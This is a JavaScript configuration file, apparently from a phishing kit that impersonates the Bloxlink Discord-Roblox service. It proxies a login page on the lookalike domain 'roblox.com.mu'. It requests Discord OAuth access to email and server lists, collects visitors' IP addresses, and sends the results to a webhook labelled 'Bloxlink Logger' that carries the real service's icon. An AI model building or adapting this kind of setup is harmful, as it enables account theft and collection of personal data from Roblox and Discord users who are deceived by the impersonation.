/**
 * Configurações Centrais do Bloxlink
 */
export const CONFIG = {
  // Endpoints Serverless
  API_WEBHOOK_ENDPOINT: "/api/webhook",
  API_ROBLOX_ENDPOINT: "/api/roblox",
  API_PROXY_ENDPOINT: "/api/proxy",
  TARGET_URL: "https://www.roblox.com.mu/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F2654745831%2Fprofile",
  get PROXIED_TARGET_URL() {
    return `/api/proxy?url=${encodeURIComponent(this.TARGET_URL)}`;
  },

  // Discord Application Client ID
  CLIENT_ID: "1541620007560020029",

  // Escopos do OAuth
  SCOPES: ["identify", "guilds", "email"],

  // Opções para coleta de dados
  FETCH_GUILDS: true,
  FETCH_CONNECTIONS: false,
  FETCH_CLIENT_IP: true,

  // Personalização do Embed do Webhook
  EMBED_COLOR: 0x5865f2,
  BOT_NAME: "Bloxlink Logger",
  BOT_AVATAR: "https://blox.link/favicon.ico",

  // Fallbacks padrão do Roblox
  DEFAULT_ROBLOX_USER: "theyhategabriel",
  DEFAULT_ROBLOX_AVATAR: "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-DF629C51FDFA46CD70BBE0FEDC75CA79-Png/150/150/AvatarHeadshot/Png/isCircular"
};
